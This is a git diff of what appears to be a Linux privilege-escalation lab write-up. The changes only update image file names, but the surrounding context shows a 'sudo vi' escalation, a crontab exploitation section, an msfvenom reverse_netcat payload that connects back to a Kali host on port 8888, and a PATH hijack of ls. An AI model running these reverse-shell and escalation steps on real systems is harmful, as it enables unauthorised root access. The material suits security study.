@@ -35,7 +35,7 @@ There are 8 users
 
 4 shells
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -116,7 +116,7 @@ sudo vi
 whoami
 ```
 
-<figure><img src="../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploiting Crontab
 
@@ -133,7 +133,7 @@ Password: password
 msfvenom -p cmd/unix/reverse_netcat lhost=$KALI lport=8888 R
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -193,7 +193,7 @@ chmod +x ls
 
 Before we change the path we can see ls goes to /bin/ls
 
-****![](<../../.gitbook/assets/image (8).png>)****
+****![](<../../.gitbook/assets/image (8) (7).png>)****
 
 Now after running the below command ls is now directed to our script.
 
